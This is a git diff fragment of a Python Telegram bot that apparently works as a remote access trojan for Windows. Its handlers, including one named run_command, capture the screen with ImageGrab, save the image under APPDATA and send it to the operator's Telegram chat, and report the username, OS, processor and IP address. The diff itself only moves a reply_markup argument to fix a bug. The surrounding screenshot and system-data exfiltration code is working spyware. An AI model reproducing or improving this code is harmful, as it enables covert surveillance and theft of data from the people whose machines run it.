@@ -526,7 +526,7 @@ def run_command(message):
 @bot.message_handler(commands=['screen'])
 def take_screenshot(message):
     try:
-        screen_path = os.path.join(os.getenv('APPDATA'), f'Screenshot_{1}.jpg', reply_markup=create_keyboard())
+        screen_path = os.path.join(os.getenv('APPDATA'), f'Screenshot_{1}.jpg')
         ImageGrab.grab().save(screen_path)
         with open(screen_path, 'rb') as screen:
             bot.send_photo(message.chat.id, screen)
@@ -556,7 +556,7 @@ def get_system_info(message):
             f"Username: {username}\n"
             f"OS: {os_info}\n"
             f"Processor: {processor}\n"
-            f"IP: {ip}"
+            f"IP: {ip}", reply_markup=create_keyboard()
         )
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())
